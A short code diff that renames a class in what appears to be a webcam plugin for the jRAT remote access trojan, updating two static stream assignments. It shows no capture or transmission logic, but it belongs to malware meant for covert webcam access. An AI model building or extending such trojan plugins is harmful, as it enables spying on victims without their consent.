@@ -8,7 +8,7 @@ import pro.jrat.api.stub.StubPlugin;
 
 import com.github.sarxos.webcam.Webcam;
 
-public class Plugin extends StubPlugin {
+public class WebcamPlugin extends StubPlugin {
 
 	public static final byte HEADER = 120;
 
@@ -28,8 +28,8 @@ public class Plugin extends StubPlugin {
 	}
 
 	public void onConnect(DataInputStream in, DataOutputStream out) {
-		Plugin.dis = in;
-		Plugin.dos = out;
+		WebcamPlugin.dis = in;
+		WebcamPlugin.dos = out;
 	}
 
 	public void onPacket(byte header) throws Exception {
